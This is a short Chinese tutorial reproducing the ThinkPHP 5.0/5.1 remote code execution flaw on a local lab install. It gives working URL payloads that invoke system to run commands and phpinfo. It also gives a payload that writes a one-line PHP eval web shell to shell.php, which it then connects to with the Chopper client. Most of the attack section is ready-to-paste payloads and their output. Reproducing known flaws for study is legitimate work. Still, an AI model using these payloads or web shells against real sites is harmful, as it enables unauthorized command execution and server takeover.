ThinkPHP是一款国内流行的开源PHP框架，某些版本可能存在远程代码执行漏洞，攻击者可向缓存文件内写入PHP代码，导致远程代码执行。虽然该漏洞利用需要有几个前提条件，但鉴于国内使用ThinkPHP框架的站点数量之多，该漏洞还是存在一定的影响范围.

受影响的版本包括 **5.0** 和 **5.1**

下载ThinkPHP5.0.22版本源码程序，放在PHPStudy运行目录下并访问

![1615289137_60475b31b3f530f3729c4.png!small](https://image.3001.net/images/20210309/1615289137_60475b31b3f530f3729c4.png!small)

1.将Payload添加进入URL地址后面进行利用

Payload1:system函数远程命令执行

?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami

![1615289151_60475b3f739c95ce2cea5.png!small](https://image.3001.net/images/20210309/1615289151_60475b3f739c95ce2cea5.png!small)

Payload2:phpinfo函数查看phpinfo()的信息

?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1

![1615289166_60475b4e196a7b2c9e19c.png!small](https://image.3001.net/images/20210309/1615289166_60475b4e196a7b2c9e19c.png!small)

2.利用Payload写入shell,并使用菜刀进行连接

Payload1:写入shell

?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo
^<?php @eval($_POST[cmd]);?^> >shell.php

**注意:**需要对特殊字符使用^转义(cmd环境下转义方式),windows环境的echo命令输出字符串到文档不用引号(单引号、双引号),部分字符url编码不编码都行.

菜刀连接

![1615289202_60475b7262baa5221efdb.png!small](https://image.3001.net/images/20210309/1615289202_60475b7262baa5221efdb.png!small)

